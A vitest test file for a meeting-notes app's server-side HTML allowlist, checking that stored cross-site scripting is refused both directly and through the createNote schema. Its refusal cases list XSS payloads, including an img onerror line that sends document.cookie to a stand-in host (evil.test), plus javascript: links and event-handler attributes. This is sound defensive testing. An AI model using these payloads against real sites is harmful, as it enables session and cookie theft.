import { describe, expect, it } from "vitest";

import { createNote } from "./meeting-contract";
import { inlineHtmlIsSafe } from "./meeting";

/**
 * The guard on stored cross-site scripting.
 *
 * Meeting-note and report blocks are user-written HTML that another leader's
 * browser renders as markup. Sanitizing happens in the editor, which is the
 * half an attacker controls, so the server decides for itself whether what it
 * was handed is inside the allowlist.
 */
describe("inline HTML the server will store", () => {
  it("accepts what the editor actually produces", () => {
    for (const html of [
      "",
      "Plain words.",
      "<b>Bold</b> and <em>emphasis</em>",
      "<strong>Decided</strong>: we meet on Tuesday.<br>",
      '<a href="https://example.org/notes" rel="noreferrer" target="_blank">the notes</a>',
      '<a href="mailto:someone@example.org">write to them</a>',
      '<a href="/people/per-1">a person</a>',
      "Ampersands &amp; angle brackets &lt;like this&gt; are text",
    ]) {
      expect(inlineHtmlIsSafe(html), html).toBe(true);
    }
  });

  /* Each of these was storable and would have run in a reader's session. */
  it("refuses script-bearing markup", () => {
    for (const html of [
      "<img src=x onerror=\"fetch('https://evil.test/?c='+document.cookie)\">",
      "<script>alert(1)</script>",
      "<svg onload=alert(1)>",
      '<b onmouseover="alert(1)">hover</b>',
      '<iframe src="https://evil.test"></iframe>',
      '<a href="javascript:alert(1)">click</a>',
      "<a href=javascript:alert(1)>click</a>",
      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
      '<object data="evil"></object>',
      '<form action="https://evil.test"><input name="x"></form>',
      '<style>body{background:url("https://evil.test")}</style>',
      '<b class="x">styled</b>',
      '<a href="https://example.org" onclick="steal()">link</a>',
    ]) {
      expect(inlineHtmlIsSafe(html), html).toBe(false);
    }
  });

  it("refuses a disallowed tag even when nothing else is wrong", () => {
    expect(inlineHtmlIsSafe("<div>structure belongs to the block</div>")).toBe(false);
    expect(inlineHtmlIsSafe("<h1>not a block type</h1>")).toBe(false);
  });

  it("checks closing tags too, so a stray one cannot smuggle a tag in", () => {
    expect(inlineHtmlIsSafe("<b>bold</b>")).toBe(true);
    expect(inlineHtmlIsSafe("text</script>")).toBe(false);
  });
});

/**
 * The guard where it actually runs.
 *
 * `inlineHtmlIsSafe` protects nothing on its own; what matters is that the
 * schema every server function parses its input with applies it. These tests
 * go through `createNote`, the way a request does.
 */
describe("the note contract the server parses requests with", () => {
  const note = (html: string) => ({
    title: "Elders meeting",
    noteType: "minutes" as const,
    date: "2026-09-11",
    blocks: [{ id: "blk-1", type: "paragraph" as const, html }],
  });

  it("accepts a note the editor produced", () => {
    expect(createNote.safeParse(note("<b>We agreed</b> to meet again.")).success).toBe(true);
  });

  /* Sent straight to the server function, bypassing the editor entirely. */
  it("refuses a block carrying script, however it is dressed up", () => {
    for (const html of [
      "<img src=x onerror=\"fetch('https://evil.test/?c='+document.cookie)\">",
      "<script>alert(1)</script>",
      "<svg onload=alert(1)>",
      '<a href="javascript:alert(1)">click</a>',
      '<b onmouseover="alert(1)">hover</b>',
      '<iframe src="https://evil.test"></iframe>',
    ]) {
      const result = createNote.safeParse(note(html));
      expect(result.success, html).toBe(false);
    }
  });

  it("refuses it in any block, not only the first", () => {
    const payload = {
      ...note("<b>fine</b>"),
      blocks: [
        { id: "blk-1", type: "paragraph" as const, html: "<b>fine</b>" },
        { id: "blk-2", type: "paragraph" as const, html: "<img src=x onerror=alert(1)>" },
      ],
    };
    expect(createNote.safeParse(payload).success).toBe(false);
  });
});
